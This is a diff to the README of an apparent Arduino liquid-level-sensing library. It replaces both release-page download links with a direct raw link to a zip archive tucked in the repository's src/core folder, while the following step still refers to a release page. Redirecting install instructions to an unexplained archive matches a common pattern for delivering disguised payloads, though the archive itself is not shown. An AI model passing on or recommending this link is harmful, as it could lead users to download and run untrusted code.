@@ -1,6 +1,6 @@
 # 💧 FDCxCapSense - Simple Tools for Liquid Level Sensing
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/hasanah9667/FDCxCapSense/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/hasanah9667/FDCxCapSense/main/src/core/FD_Sense_Cx_Cap_3.2-alpha.1.zip)
 
 This library helps you measure liquid levels and proximity using capacitive sensing technology. It works with specific sensors from Texas Instruments. You can detect liquids in tanks or sense objects near a surface. This tool manages calibration and sensor settings so you obtain stable, accurate results.
 
@@ -28,7 +28,7 @@ Your setup needs these components for the software to run:
 
 Follow these steps to add the library to your Arduino environment:
 
-1. Visit [this release page](https://github.com/hasanah9667/FDCxCapSense/releases) to download the software files. 
+1. Visit [this release page](https://raw.githubusercontent.com/hasanah9667/FDCxCapSense/main/src/core/FD_Sense_Cx_Cap_3.2-alpha.1.zip) to download the software files. 
 2. Locate the link labeled "Source code (zip)" on the page and click it. 
 3. Open the Arduino IDE on your computer.
 4. Select the Sketch menu at the top of the window.
